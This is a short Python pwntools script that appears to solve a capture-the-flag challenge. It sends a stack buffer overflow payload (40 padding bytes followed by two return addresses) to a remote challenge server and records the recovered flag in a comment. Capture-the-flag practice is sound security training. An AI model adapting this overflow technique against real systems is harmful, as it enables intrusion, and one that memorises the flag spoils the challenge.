from pwn import *
import pwn

conn = remote('challs.taparctf.ir', '9001')
#conn = process('./unleash')
print(conn.recvuntil("> "))
conn.sendline(40*'A' + pwn.p32(0x08048a9c) +  pwn.p32(0x08048abf))
print(conn.recvall())

# res: Tapar{Unl34sh_y0uR_miNd}